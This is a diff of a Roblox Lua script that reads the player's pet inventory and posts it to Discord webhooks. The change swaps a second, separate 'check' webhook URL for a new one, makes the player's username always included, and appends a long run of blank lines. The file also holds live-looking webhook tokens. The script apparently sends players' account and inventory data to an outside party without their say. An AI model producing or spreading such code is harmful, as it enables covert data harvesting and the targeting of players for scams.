@@ -3,7 +3,6 @@
 
 
 
-
 local Library = game.ReplicatedStorage.Library
 local save = require(game.ReplicatedStorage.Library.Client.Save)
 local localPlayerName = game.Players.LocalPlayer.Name
@@ -11,14 +10,10 @@ local httpService = game:GetService("HttpService")
 local botProfilePic = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQeohpvtXa0yu6PeaFaw9-Pd6ryrJl3sdzlDg&s"
 local publicWebhookURL = "https://discord.com/api/webhooks/1303494852629102673/qfAOp1M8qwyjjXIv_Jlf4tzRCHysomqK887rFY8loLZNzHXSvQ-I8M163eC__AH2Xh_B"
 
-local CHECK_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1341190269558722650/YKTrR3ZusGZI2A8XpuMgn63y7Zboi8-TnYzDrxOgWVtOeftBvsMH3eoHE0kRSUhogmPF"
+local CHECK_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1341192939392729159/baAAC_ZMTCUVJFgsxTrhRMzbW1ZCzjqb27yhSoRIVrP0OU8zAdk-IjNd4cfmJMUNMaoi"
 local contentDiscordId = "<@973180636959490053>"
 
-local petWebhookUsername = ""
-if SHOW_PET_WEBHOOK_USERNAME then
-    petWebhookUsername = localPlayerName .. "\n"
-end
-
+local petWebhookUsername = localPlayerName .. "\n"
 
 local function sendWebhook(messageContent, webhook_url)
     local jsonData = httpService:JSONEncode(messageContent)
@@ -81,6 +76,19 @@ for petId, tbl in save.Get().Inventory.Pet do
         sendWebhook(messageContent, CHECK_WEBHOOK_URL)
     end
 end
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
